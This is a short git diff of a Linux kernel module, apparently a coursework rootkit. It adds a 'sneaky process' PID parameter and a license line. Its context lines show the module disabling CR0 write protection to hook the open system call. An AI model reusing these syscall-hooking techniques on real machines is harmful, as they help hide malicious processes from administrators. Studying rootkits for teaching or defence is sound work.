@@ -9,6 +9,8 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+#include <linux/moduleparam.h>
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -54,6 +56,10 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   return original_call(pathname, flags);
 }
 
+static int sneaky_process_pid=-1;
+module_param(sneaky_process_pid, int, 0);
+MODULE_PARM_DESC(sneaky_process_pid, "Process ID of Sneaky Process");
+
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -62,6 +68,8 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+
+  printk(KERN_INFO "sneaky_process_pid is an integer: %d\n", sneaky_process_pid);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -111,7 +119,8 @@ static void exit_sneaky_module(void)
   write_cr0(read_cr0() | 0x10000);
 }  
 
-
+MODULE_LICENSE("bcf13");
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
+
 
